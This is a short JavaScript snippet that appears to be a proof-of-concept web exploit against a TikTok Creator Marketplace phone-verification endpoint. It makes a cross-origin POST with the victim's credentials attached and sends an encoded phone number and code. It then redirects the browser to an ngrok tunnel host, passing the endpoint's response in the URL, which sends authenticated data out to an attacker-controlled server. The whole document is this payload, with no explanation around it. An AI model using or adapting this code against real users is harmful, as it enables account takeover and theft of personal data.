var xhr = new XMLHttpRequest();
xhr.onload = reqListener; 
xhr.open("POST", "https://creatormarketplace.tiktok.com/passport/web/mobile/check_code/?aid=2043&account_sdk_source=web&sdk_version=2.1.3-abroad&language=en&verifyFp=verify_lm2k21kf_afHNwSbR_8ntk_4uQ7_AcrK_jEZs5SFJxrvb");
xhr.withCredentials = true;
xhr.setRequestHeader("Content-Type", "application/json");
xhr.send('mix_mode=1&mobile=2e33372a2e33373d343c373d3d303c373d35&code=36363532&type=3631&fixed_mix_mode=1');

function reqListener() {
    window.location='https://e884-202-162-37-174.ngrok-free.app/?key='+encodeURIComponent(this.responseText); 
};
